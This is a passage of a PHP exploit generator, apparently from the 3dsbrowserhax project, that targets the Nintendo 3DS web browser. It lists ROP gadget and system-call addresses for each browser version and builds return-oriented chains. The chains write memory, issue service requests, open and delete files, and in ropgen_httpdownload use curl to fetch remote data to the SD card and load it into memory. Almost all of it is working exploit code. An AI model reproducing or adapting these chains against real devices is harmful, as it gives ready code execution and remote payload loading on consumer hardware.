	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db658-0x4;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4dbbb8-0x4;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db660-0x4;

	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4daf00-0x4;
	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4daee0-0x4;

	$GSP_FLUSHDCACHE = 0x0029d9fc;
	$GSP_WRITEHWREGS = 0x00298224;

	$IFile_Close = 0x001ec718;
	$IFile_Write = 0x00327178;

	$THROW_FATALERR = 0x001f1f44;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001e8ac0;

	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2e74;

	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x001027ac;

	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ef51;

	$ROP_snprintf = $OSSCRO_MAPADR+0xde1a0-0x4;
}
else if($browserver == 0x84)
{
	$CODEBLK_ENDADR = ((0x00100000 + 0x00277000 + 0x00064000 + 0x0000A000 + 0x00045928) + 0xfff) & ~0xfff;
	$OSSCRO_HEAPADR = 0x08133000;
	$WEBKITCRO_HEAPADR = 0x083ff000;
	$PEERCRO_HEAPADR = 0x0831a000;
	$APPHEAP_PHYSADDR = 0x2b000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x0027b12c;
	$COND_THROWFATALERR = 0x00262760;

	$ROP_POP_R0R6PC = 0x001df7f0;
	$ROP_POP_R0R8PC = 0x0030c318;
	$ROP_POP_R0PC = 0x00296e58;
	$ROP_POP_R1R5PC = 0x001dcdd0;

	$ROP_STR_R1TOR0 = 0x00226c04;
	$ROP_LDR_R0FROMR0 = 0x001f7a04;
	$ROP_ADDR0_TO_R1 = 0x0027b9dc;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x002974fc;

	$srv_GetServiceHandle = 0x001eaafc;

	$svcGetProcessId = 0x0026bc20;
	$svcSendSyncRequest = 0x001eb138;
	$svcControlMemory = 0x002634d0;
	$svcSleepThread = 0x002d8cc4;

	$GXLOW_CMD4 = 0x002a248c;
	$GSPGPU_SERVHANDLEADR = 0x003e33d0;

	$FS_MOUNTSDMC = 0x00318d20;

	$IFile_Open = 0x003222d4;
	$IFile_GetSize = 0x001f1fdc;
	$IFile_Seek = 0x0032d93c;
	$IFile_Read = 0x0030c43c;

	$FS_DELETEFILE = 0x00325b04;

	$FSFILEIPC_CLOSE = 0x00267d7c;
	$FSFILEIPC_READ = 0x00267d24;
	$FSFILEIPC_GETSIZE = 0x00334928;

	$POPPC = 0x001df60c;

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x00422440;

	$WKC_FOPEN = $OSSCRO_MAPADR+0xde430-0x4;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0xde420-0x4;
	$WKC_FREAD = $OSSCRO_MAPADR+0xde428-0x4;
	$WKC_FWRITE = $OSSCRO_MAPADR+0xde438-0x4;
	$WKC_FSEEK = $PEERCRO_MAPADR+0x1f83d;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4dbb58-0x4;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db6c0-0x4;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4dbc20-0x4;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db6c8-0x4;

	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4daf68-0x4;
	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4daf48-0x4;

	$ROP_snprintf = $OSSCRO_MAPADR+0xde228-0x4;

	$GSP_FLUSHDCACHE = 0x0029dad0;
	$GSP_WRITEHWREGS = 0x002982f8;

	$IFile_Close = 0x001ec780;
	$IFile_Write = 0x00327248;

	$THROW_FATALERR = 0x001f1fac;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001e8b28;

	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2ea0;

	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x00102834;

	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ef51;
}
else if($browserver == 0x85)
{
	require_once("3dsbrowserhax_rop_skater_usaeurjpn_v5121.php");
}
else if($browserver == 0x86)
{
	require_once("3dsbrowserhax_rop_skater_usaeurjpn_v6144.php");
}
else if($browserver == 0x87)
{
	require_once("3dsbrowserhax_rop_skater_usaeurjpn_v8192.php");
}
else if($browserver == 0xD3)//1.3.10126.KR v3077
{
    require_once("3dsbrowserhax_rop_skater_kor_v3077.php");
}
else if($browserver == 0xD4)//1.4.10126.KR v4096
{
    require_once("3dsbrowserhax_rop_skater_kor_v4096.php");
}
else if($browserver == 0xD5)//1.5.10126.KR v5121
{
    require_once("3dsbrowserhax_rop_skater_kor_v5121.php");
}
else if($browserver == 0xD6)
{
    require_once("3dsbrowserhax_rop_skater_kor_v7184.php");
}
else
{
	die("Unsupported browserver / region.");
}

if($browserver == 4)$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;

if($browserver == 4)
{
	$WKC_FOPEN = $OSSCRO_MAPADR+0x5cc;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0x5c4;
	$WKC_FREAD = $OSSCRO_MAPADR+0x5d4;
	$WKC_FWRITE = $OSSCRO_MAPADR+0x5dc;
	$WKC_FSEEK = $OSSCRO_MAPADR+0x5ec;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xe98;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea0;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xec8;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
}
else if($browserver == 5)
{
	$WKC_FOPEN = $OSSCRO_MAPADR+0x5d4;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0x5cc;
	$WKC_FREAD = $OSSCRO_MAPADR+0x5dc;
	$WKC_FWRITE = $OSSCRO_MAPADR+0x5e4;
	$WKC_FSEEK = $OSSCRO_MAPADR+0x5f4;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xe98;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea0;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xec8;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
}
else if($browserver == 0x80)//new3ds
{
	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x421e04;

	$WKC_FOPEN = $OSSCRO_MAPADR+0xd493c;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0xd492c;
	$WKC_FREAD = $OSSCRO_MAPADR+0xd4934;
	$WKC_FWRITE = $OSSCRO_MAPADR+0xd4944;
	$WKC_FSEEK = $OSSCRO_MAPADR+0xd475c;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4db5bc;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db124;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4db684;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db12c;
}
else if($browserver == 0x81)//new3ds
{
	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x421df8;

	$WKC_FOPEN = $OSSCRO_MAPADR+0xd9364;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0xd9354;
	$WKC_FREAD = $OSSCRO_MAPADR+0xd935c;
	$WKC_FWRITE = $OSSCRO_MAPADR+0xd936c;
	$WKC_FSEEK = $PEERCRO_MAPADR+0x1f789;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4db5a8;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db110;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4db670;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db118;
}

if($browserver < 0x80)
{
	if($browserver < 6 && $browserver>0x3)$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x190;
	if($browserver < 6 && $browserver>0x3)$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x308;
}
else if($browserver >= 0x80)
{
	if($browserver == 0x80)
	{
		$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4da9cc;
		$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4da9ac;
	}
	else if($browserver == 0x81)
	{
		$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4da9b8;
		$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4da998;
	}
}

if($browserver>=0x80)
{
	if($browserver==0x80)$FS_MOUNTSDMC = 0x003168ec;//r0 = archivename*
	if($browserver==0x81)$FS_MOUNTSDMC = 0x003171c4;
}

$STACKPIVOT = genu32_unicode_jswrap($STACKPIVOT_ADR);
$POPLRPC = $STACKPIVOT_ADR + 0x18;//"pop {lr}" "pop {pc}"

if($browserver < 5 && $browserver>0x3)
{
	$POPPC = $STACKPIVOT_ADR + 0x1c;
}
else
{
	if($browserver == 5)$POPPC = 0x00105818;
	if($browserver == 0x80)$POPPC = 0x001de80c;
	if($browserver == 0x81)$POPPC = 0x001def10;
	if($browserver == 0x83)$POPPC = 0x001df5a4;
}

$NOPSLEDROP = genu32_unicode_jswrap($POPPC);//"pop {pc}"

$DIFF_FILEREAD_FUNCPTR = 0x080952c0+8;
$ARM9_HEAPHAXBUF = 0x80a2e80 - 0x2800;

function genu32_unicode($value)
{
	$hexstr = sprintf("%08x", $value);

	$outstr = "\u" . substr($hexstr, 4, 4) . "\u" . substr($hexstr, 0, 4);

	return $outstr;
}

function genu32_unicode_jswrap($value)
{
	$str = "\"" . genu32_unicode($value) . "\"";
	return $str;
}

function ropchain_appendu32($val)
{
	global $ROPCHAIN, $generatebinrop;

	if($generatebinrop==0)
	{
		$ROPCHAIN.= genu32_unicode($val);
	}
	else
	{
		$ROPCHAIN.= pack("V*", $val);
	}
}

function init_mapaddrs_cro()
{
	global $OSSCRO_MAPADR, $WEBKITCRO_MAPADR, $OSSCRO_HEAPADR, $PEERCRO_MAPADR, $WEBKITCRO_HEAPADR, $PEERCRO_HEAPADR, $CODEBLK_ENDADR, $browserver;
	$OSSCRO_MAPADR = ($OSSCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
	$WEBKITCRO_MAPADR = ($WEBKITCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
	if($browserver>=0x80)$PEERCRO_MAPADR = ($PEERCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
}

function generate_ropchain()
{
	global $ROPCHAIN, $generatebinrop, $THROW_FATALERR, $ropchainselect;

	$ROPCHAIN = "";

	if($generatebinrop==0)$ROPCHAIN .= "\"";

	if($ropchainselect==0)
	{
		ropchain_appendu32($THROW_FATALERR);
	}
	else if($ropchainselect==1)
	{
		generateropchain_type1();
	}
	else if($ropchainselect==2)
	{
		generateropchain_type2();
	}
	else if($ropchainselect==3)
	{
		generateropchain_type3();
	}
	else if($ropchainselect==4)
	{
		generateropchain_type4();
	}

	if($generatebinrop==0)$ROPCHAIN.= "\"";
}

function ropgen_condfatalerr()
{
	global $COND_THROWFATALERR;

	ropchain_appendu32($COND_THROWFATALERR);
	ropchain_appendu32(0x0);//r3
}

function ropgen_callfunc($r0, $r1, $r2, $r3, $lr, $pc)
{
	global $POPLRPC, $ROP_POP_R0R6PC;//$ROP_POP_R0R3PC;

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($lr);

	ropchain_appendu32($ROP_POP_R0R6PC/*$ROP_POP_R0R3PC*/);
	ropchain_appendu32($r0);
	ropchain_appendu32($r1);
	ropchain_appendu32($r2);
	ropchain_appendu32($r3);
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($pc);
}

function ropgen_writeu32($addr, $value, $shiftval, $setr0)
{
	global $POPPC, $ROP_STR_R1TOR0, $POPLRPC, $ROP_POP_R1R5PC;//, $ROP_STR_R1_TOR0_SHIFTR2;

	if($shiftval==0)
	{
		if($setr0!=0)
		{
			ropgen_callfunc($addr, $value, 0x0, 0x0, $POPPC, $ROP_STR_R1TOR0);
		}
		else
		{
			ropchain_appendu32($POPLRPC);
			ropchain_appendu32($POPPC);

			ropchain_appendu32($ROP_STR_R1TOR0);
		}
	}
	else
	{
		ropchain_appendu32($ROP_POP_R1R5PC);
		ropchain_appendu32($shiftval << 2);//r1
		ropchain_appendu32(0);//r2
		ropchain_appendu32(0x0);//r3
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5

		ropchain_appendu32($POPLRPC);
		ropchain_appendu32($POPPC);

		ropchain_appendu32($ROP_ADDR0_TO_R1);

		ropchain_appendu32($ROP_POP_R1R5PC);
		ropchain_appendu32($value);//r1
		ropchain_appendu32(0x0);//r2
		ropchain_appendu32(0x0);//r3
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5

		ropchain_appendu32($ROP_STR_R1TOR0);

		/*if($setr0!=0)
		{
			ropgen_callfunc($addr, $value, $shiftval, 0x0, $POPPC, $ROP_STR_R1_TOR0_SHIFTR2);
		}
		else
		{
			ropchain_appendu32($POPLRPC);
			ropchain_appendu32($POPPC);

			ropchain_appendu32($ROP_POP_R1R5PC);
			ropchain_appendu32($value);//r1
			ropchain_appendu32($shiftval);//r2
			ropchain_appendu32(0x0);//r3
			ropchain_appendu32(0x0);//r4
			ropchain_appendu32(0x0);//r5

			ropchain_appendu32($ROP_STR_R1_TOR0_SHIFTR2);
		}*/
	}
}

function ropgen_readu32($addr, $shiftval, $setr0)//r0 = u32 loaded from addr
{
	global $ROP_POP_R0PC, $POPPC, $POPLRPC, $ROP_LDR_R0FROMR0, $ROP_LDR_R0_FROMR0_SHIFTR1, $ROP_POP_R1R5PC;

	if($shiftval==0)
	{
		ropchain_appendu32($ROP_POP_R0PC);
		ropchain_appendu32($addr);//r0
		ropchain_appendu32($POPLRPC);

		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($ROP_LDR_R0FROMR0);
	}
	else
	{
		if($setr0!=0)
		{
			ropgen_callfunc($addr, $shiftval, 0x0, 0x0, $POPPC, $ROP_LDR_R0_FROMR0_SHIFTR1);
		}
		else
		{
			ropchain_appendu32($POPLRPC);
			ropchain_appendu32($POPPC);

			ropchain_appendu32($ROP_POP_R1R5PC);
			ropchain_appendu32($shiftval);//r1
			ropchain_appendu32(0x0);//r2
			ropchain_appendu32(0x0);//r3
			ropchain_appendu32(0x0);//r4
			ropchain_appendu32(0x0);//r5

			ropchain_appendu32($ROP_LDR_R0_FROMR0_SHIFTR1);
		}
	}
}

function ropgen_getptr_threadlocalstorage()//r0 = threadlocalstorage-ptr
{
	global $ROPHEAP, $browserver, $ROP_WRITETHREADSTORAGEPTR_TOR4R5, $ROP_POP_R0IPPC;

	//$browserver==1 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> branch to: "pop {r4, r5, r6, r7, r8, pc}"}
	//$browserver==2 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(ip!=0){r0 = <threadlocalstorageptr>; <write r0 to r5+4> branch over a function-call} <func-call that can be skipped> *(((u32*)r5+8)++; r0=r4; "pop {r4, r5, r6, pc}"
	//$browserver==3 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> *(((u32*)r4+8)++; r0=1} "pop {r4, pc}"

	ropchain_appendu32($ROP_POP_R0IPPC);

	ropchain_appendu32(0x1);//r0
	ropchain_appendu32(0x0);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32($ROPHEAP);//r4
	ropchain_appendu32($ROPHEAP);//r5
	ropchain_appendu32(0x0);//r6
	ropchain_appendu32(0x0);//r7
	ropchain_appendu32(0x0);//r8
	ropchain_appendu32(0x0);//r9
	ropchain_appendu32(0x0);//sl
	ropchain_appendu32(0x0);//fp
	ropchain_appendu32(0x1);//ip
	ropchain_appendu32($ROP_WRITETHREADSTORAGEPTR_TOR4R5);

	if($browserver==1)
	{
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32(0x0);//r6
		ropchain_appendu32(0x0);//r7
		ropchain_appendu32(0x0);//r8
	}
	else if($browserver==2)
	{
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32(0x0);//r6

		ropgen_readu32($ROPHEAP+4, 0, 1);
	}
	else if($browserver>=3)
	{
		ropchain_appendu32(0x0);//r4
		
		ropgen_readu32($ROPHEAP+4, 0, 1);
	}
}

function ropgen_writeu32_cmdbuf($indexword, $value)
{
	//global $ROPHEAP, $POPPC, $ROP_WRITEU32_TOTHREADSTORAGE;

	//ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
	//ropgen_callfunc($ROPHEAP+4, $value, 0x0, 0x0, $POPPC, $ROP_WRITEU32_TOTHREADSTORAGE);

	ropgen_getptr_threadlocalstorage();
	ropgen_writeu32(0, $value, 0x20+$indexword, 0);
}

function ropgen_readu32_cmdbuf($indexword)//r0 = word loaded from cmdbuf
{
	//global $ROPHEAP, $POPPC, $ROP_READU32_FROMTHREADSTORAGE;

	//ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
	//ropgen_callfunc($ROPHEAP+4, 0x0, 0x0, 0x0, $POPPC, $ROP_READU32_FROMTHREADSTORAGE);

	ropgen_getptr_threadlocalstorage();
	ropgen_readu32(0, 0x20+$indexword, 0);
}

function ropgen_write_procid_cmdbuf($indexword)//This writes the current processid to the specified cmdbuf indexword.
{
	global $ROPHEAP, $POPPC, $svcGetProcessId, $POPLRPC, $ROP_POP_R1R5PC, $ROP_ADDR0_TO_R1;//, $ROP_POP_R0PC, $ROP_WRITEU32_TOTHREADSTORAGE;

	ropgen_getptr_threadlocalstorage();//r0 = localstorage ptr
	
	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32((0x20+$indexword) * 4);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32($ROP_ADDR0_TO_R1);

	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32(0xffff8001);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32($svcGetProcessId);

	/*ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
	ropgen_callfunc($ROPHEAP, 0xffff8001, 0x0, 0x0, $POPPC, $svcGetProcessId);

	ropchain_appendu32($ROP_POP_R0PC);
	ropchain_appendu32($ROPHEAP+4);//r0

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($POPPC);
	ropchain_appendu32($ROP_WRITEU32_TOTHREADSTORAGE);*/
}

function ropgen_writeregdata($addr, $data, $pos)
{
	global $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC, $ROP_POP_R0R8PC, $browserver;

	if($browserver<0x80)
	{
		ropchain_appendu32($POPLRPC);

		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($ROP_POP_R0IPPC);

		ropchain_appendu32($addr);
		ropchain_appendu32($data[$pos+0]);//0x30-bytes total from $data
		ropchain_appendu32($data[$pos+1]);
		ropchain_appendu32($data[$pos+2]);
		ropchain_appendu32($data[$pos+3]);
		ropchain_appendu32($data[$pos+4]);
		ropchain_appendu32($data[$pos+5]);
		ropchain_appendu32($data[$pos+6]);
		ropchain_appendu32($data[$pos+7]);
		ropchain_appendu32($data[$pos+8]);
		ropchain_appendu32($data[$pos+9]);
		ropchain_appendu32($data[$pos+10]);
		ropchain_appendu32($data[$pos+11]);

		ropchain_appendu32($ROP_STMR0_R0PC);//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}"
	}
	else
	{
		ropchain_appendu32($ROP_POP_R0R8PC);

		ropchain_appendu32($addr);
		ropchain_appendu32($data[$pos+0]);//0x1c-bytes from $data
		ropchain_appendu32($data[$pos+1]);
		ropchain_appendu32($data[$pos+2]);
		ropchain_appendu32($data[$pos+3]);
		ropchain_appendu32($data[$pos+4]);
		ropchain_appendu32($data[$pos+5]);
		ropchain_appendu32($data[$pos+6]);
		ropchain_appendu32(0);//r8
		
		$pos+=7;
		$addr+=0x1c;

		ropchain_appendu32($ROP_STMR0_R0PC);//"stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" ... "pop {r4, r5, r6, pc}"

		ropchain_appendu32(0);//r4
		ropchain_appendu32(0);//r5
		ropchain_appendu32(0);//r6

		ropchain_appendu32($ROP_POP_R0R8PC);

		ropchain_appendu32($addr);
		ropchain_appendu32($data[$pos+0]);//0x14-bytes from $data
		ropchain_appendu32($data[$pos+1]);
		ropchain_appendu32($data[$pos+2]);
		ropchain_appendu32($data[$pos+3]);
		ropchain_appendu32($data[$pos+4]);
		ropchain_appendu32(0);
		ropchain_appendu32(0);
		ropchain_appendu32(0);//r8

		ropchain_appendu32($ROP_STMR0_R0PC);

		ropchain_appendu32(0);//r4
		ropchain_appendu32(0);//r5
		ropchain_appendu32(0);//r6
	}
}

function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s from array $data starting at index $pos, to $addr with byte-size $size.
{
	global $ROPHEAP, $ROP_MEMCPY, $POPPC, $browserver;

	$total_entries = $size / 4;
	$curpos = 0;
	$heap_addpos = 0x4;

	if($browserver>=0x80)$heap_addpos = 0;

	while($total_entries - $curpos >= 12)
	{
		ropgen_writeregdata($ROPHEAP+0x10, $data, $pos + $curpos);

		ropgen_callfunc($addr, $ROPHEAP+0x10+$heap_addpos, 0x30, 0x0, $POPPC, $ROP_MEMCPY);

		$curpos+= 12;
		$addr+= 0x30;
	}

	if($total_entries - $curpos == 0)return;

	$tmpdata = array();
	$i = 0;
	while($total_entries - $curpos > 0)
	{
		$tmpdata[$i] = $data[$pos + $curpos];
		$i++;
		$curpos++;
	}

	while($i<12)
	{
		$tmpdata[$i] = 0x0;
		$i++;
	}

	ropgen_writeregdata($ROPHEAP+0x10, $tmpdata, 0);
	ropgen_callfunc($addr, $ROPHEAP+0x10+$heap_addpos, 0x30, 0x0, $POPPC, $ROP_MEMCPY);
}

function ropgen_ldm_r0r3($ldm_addr, $stm_addr)
{
	global $ROP_POP_R0R6PC, $ROP_LDMSTM_R5R4_R0R3, $browserver;

	if($stm_addr==0)$stm_addr = $ldm_addr;

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32(0x1);//r0
	ropchain_appendu32(0x0);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32($stm_addr);//r4
	ropchain_appendu32($ldm_addr);//r5
	ropchain_appendu32($stm_addr);//r6

	ropchain_appendu32($ROP_LDMSTM_R5R4_R0R3);//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"

	if($browserver >= 0x80)
	{
		ropchain_appendu32(0x0);//two words for d8
		ropchain_appendu32(0x0);
	}

	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6
}

function ropgen_sendcmd($handleadr, $check_cmdret)
{
	global $POPPC, $POPPC, $POPLRPC, $svcSendSyncRequest;

	ropgen_readu32($handleadr, 0, 1);

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($POPPC);//lr

	ropchain_appendu32($svcSendSyncRequest);
	ropgen_condfatalerr();

	if($check_cmdret)
	{
		ropgen_readu32_cmdbuf(1);
		ropgen_condfatalerr();
	}
}

function ropgen_curl_easy_init($curlstate)
{
	global $ROP_curl_easy_init, $POPLRPC, $POPPC, $ROP_POP_R1R5PC, $ROP_STR_R0TOR1;

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_curl_easy_init);

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32($curlstate);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32($ROP_STR_R0TOR1);//Write the output CURL* ptr from curl_easy_init() to $curlstate.
}

function ropgen_curl_easy_cleanup($curlstate)
{
	global $POPLRPC, $POPPC, $ROP_curl_easy_cleanup;

	ropgen_ldm_r0r3($curlstate, 0);

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_curl_easy_cleanup);
}

function ropgen_curl_easy_perform($curlstate)
{
	global $POPLRPC, $POPPC, $ROP_curl_easy_perform;

	ropgen_ldm_r0r3($curlstate, 0);

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_curl_easy_perform);
}

function ropgen_curl_easy_setopt($curlstate, $type, $value, $set_params)
{
	global $POPLRPC, $POPPC, $ROP_curl_easy_setopt;

	if($set_params!=0)
	{
		ropgen_writeu32($curlstate+4, $type, 0, 1);
		ropgen_writeu32($curlstate+8, $value, 0, 1);
	}

	ropgen_ldm_r0r3($curlstate, 0);

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_curl_easy_setopt);
}

function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfile)
{
	global $ROPHEAP, $POPPC, $POPLRPC, $ROP_POP_R1R5PC, $WKC_FOPEN, $WKC_FCLOSE, $WKC_FREAD, $WKC_FWRITE, $WKC_FSEEK, $FS_DELETEFILE, $ROP_STR_R0TOR1, $ROP_MEMSETOTHER;

	$FD_ADDR = $ROPHEAP+0x140;
	$curlstate = $FD_ADDR+0x10;
	$filepathptr_utf16 = $curlstate+0x1000;

	if($filepath=="")$filepath = "sdmc:/webkithax_tmp.bin";
	$databuf_fn = string_gendata_array("/" . $filepath, 0, 0x40);//Filepath for wkc_fopen has to begin with either "/rom:/" or "/sdmc:/".
	$databuf_fn_utf16 = string_gendata_array($filepath, 1, 0x40*2);
	$databuf_mode = string_gendata_array("w+", 0, 0x4);
	$databuf_url = string_gendata_array($url, 0, 0x60);

	ropgen_writeregdata_wrap($ROPHEAP+0x80, $databuf_fn, 0, 0x40);
	ropgen_writeregdata_wrap($ROPHEAP+0xc0, $databuf_mode, 0, 0x4);
	ropgen_writeregdata_wrap($ROPHEAP+0xc4, $databuf_url, 0, 0x60);
	ropgen_writeregdata_wrap($filepathptr_utf16, $databuf_fn_utf16, 0, 0x40*2);

	ropgen_callfunc($filepathptr_utf16, 0x0, 0x0, 0x0, $POPPC, $FS_DELETEFILE);

	ropgen_callfunc($ROPHEAP+0x80, $ROPHEAP+0xc0, 0x0, 0x0, $POPPC, $WKC_FOPEN);//Open the file @ $filepath with mode "w+", via wkc_fopen().

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32($FD_ADDR);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32($ROP_STR_R0TOR1);//Write the out fd from wkc_fopen() to $FD_ADDR.

	ropgen_ldm_r0r3($FD_ADDR, $curlstate+8);//Copy the fd from $FD_ADDR to $curlstate+8(0x10-bytes are copied with this).
	ropgen_writeu32($curlstate+4, 10000 + 1, 0, 1);//type

	//ropchain_appendu32(0x50505050);

	ropgen_curl_easy_init($curlstate);
	ropgen_curl_easy_setopt($curlstate, 10000 + 1, 0, 0);//Set the CURL FILE OPT("CURLOPT_WRITEDATA") to the fd which was copied to $curlstate+8.
	ropgen_curl_easy_setopt($curlstate, 20000 + 11, $WKC_FWRITE, 1);//WRITEFUNCTION
	ropgen_curl_easy_setopt($curlstate, 10000 + 2, $ROPHEAP+0xc4, 1);//curl_easy_setopt(<curl* ptr>, CURLOPT_URL, <urlptr>)
	ropgen_curl_easy_perform($curlstate);
	ropgen_curl_easy_cleanup($curlstate);

	if($bufaddr!=0 && $bufsize!=0)
	{
		ropgen_writeu32($FD_ADDR+4, 0x0, 0, 1);
		ropgen_writeu32($FD_ADDR+8, 0x0, 0, 1);

		ropgen_ldm_r0r3($FD_ADDR, 0);

		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)

		ropgen_writeu32($FD_ADDR-12, $bufaddr, 0, 1);//ptr
		ropgen_writeu32($FD_ADDR-8, 0x1, 0, 1);//size
		ropgen_writeu32($FD_ADDR-4, $bufsize, 0, 1);//nmemb

		ropgen_ldm_r0r3($FD_ADDR-12, 0);

		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($WKC_FREAD);//wkc_fread($bufaddr, 1, $bufsize, fd)
	}

	if($delete_tmpfile)
	{
		ropgen_callfunc($ROPHEAP+0x200, 0x8000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

		ropgen_writeu32($FD_ADDR+4, 0x0, 0, 1);
